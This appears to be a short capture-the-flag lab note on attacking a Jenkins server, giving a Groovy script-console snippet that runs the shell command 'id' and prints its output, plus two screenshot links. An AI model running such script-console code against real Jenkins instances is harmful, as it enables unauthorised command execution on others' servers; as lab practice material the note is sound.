# [Attacking Jenkins](Attacking%20Jenkins.md)
### Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory

```groovy
def cmd = 'id' 
def sout = new StringBuffer(), serr = new StringBuffer() 
def proc = cmd.execute() 
proc.consumeProcessOutput(sout, serr) 
proc.waitForOrKill(1000) 
println sout
```
![](Screenshot%202026-07-30%20at%2012.50.27.png)
![](Screenshot%202026-07-30%20at%2012.51.04.png)
